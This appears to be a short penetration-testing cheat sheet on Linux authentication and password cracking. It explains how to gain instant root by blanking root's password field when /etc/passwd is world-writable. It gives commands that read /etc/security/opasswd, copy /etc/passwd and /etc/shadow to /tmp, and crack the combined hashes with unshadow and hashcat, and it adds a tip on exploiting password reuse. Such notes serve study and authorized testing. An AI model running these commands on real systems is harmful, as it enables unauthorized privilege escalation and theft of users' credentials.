# Linux Authentication Process & Credential Cracking

Check if `/etc/passwd` is world-writable — if so, blank the root password field for instant root:

```bash
ls -la /etc/passwd
head -n 1 /etc/passwd
```

If writable, remove the `x` from root's password field → `su` with no password prompt.

Hash algorithm IDs in `/etc/shadow` (`$<id>$<salt>$<hash>`): `$1$` = MD5 (fast to crack), `$5$` = SHA-256, `$6$` = SHA-512, `$y$` = yescrypt (modern Debian default, slow).

Check `/etc/security/opasswd` for old password hashes — often MD5 even when current shadow uses SHA-512, and reveals reuse patterns:

```bash
sudo cat /etc/security/opasswd
```

Combine passwd + shadow for cracking with unshadow, then hashcat mode 1800 (sha512crypt) or john:

```bash
sudo cp /etc/passwd /tmp/passwd.bak && sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes <WORDLIST> -o /tmp/unshadowed.cracked
```

> [!tip] `opasswd` entries are often MD5 (`$1$`) — crack those first, then use them as base patterns for current passwords. Users append numbers/symbols to reused passwords.